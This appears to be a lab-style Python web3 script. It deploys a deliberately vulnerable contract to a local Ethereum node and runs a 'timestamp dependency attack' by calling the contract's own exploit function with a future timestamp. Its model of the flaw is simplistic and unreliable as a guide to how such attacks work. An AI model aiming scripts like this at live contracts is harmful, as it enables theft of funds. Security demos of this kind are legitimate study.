from web3 import Web3
import json
import time

# Connect to Ethereum node
w3 = Web3(Web3.HTTPProvider('http://localhost:8545'))

# Function to load contract ABI and bytecode
def load_contract_data(file_path):
    try:
        with open(file_path) as f:
            data = json.load(f)
        return data['abi'], data['bytecode']
    except Exception as e:
        print(f"Failed to load contract data: {e}")
        return None, None

# Function to deploy a smart contract
def deploy_contract(abi, bytecode):
    try:
        contract = w3.eth.contract(abi=abi, bytecode=bytecode)
        tx_hash = contract.constructor().transact()
        tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
        return w3.eth.contract(address=tx_receipt.contractAddress, abi=abi)
    except Exception as e:
        print(f"Failed to deploy contract: {e}")
        return None

# Function to perform a timestamp dependency attack
def perform_timestamp_dependency_attack(vulnerable_contract):
    try:
        future_timestamp = int(time.time()) + 3600  # Set future timestamp (1 hour ahead)
        tx_hash = vulnerable_contract.functions.exploitTimestampDependency(future_timestamp).transact()
        tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
        print(f"Timestamp dependency attack completed. Transaction receipt: {tx_receipt}")
    except Exception as e:
        print(f"Failed to perform timestamp dependency attack: {e}")

# Main execution
if __name__ == "__main__":
    abi, bytecode = load_contract_data('TimestampDependencyVulnerableContract.json')
    if abi and bytecode:
        vulnerable_contract = deploy_contract(abi, bytecode)
        if vulnerable_contract:
            perform_timestamp_dependency_attack(vulnerable_contract)
        else:
            print("Failed to deploy the vulnerable contract.")
    else:
        print("Failed to load contract data.")
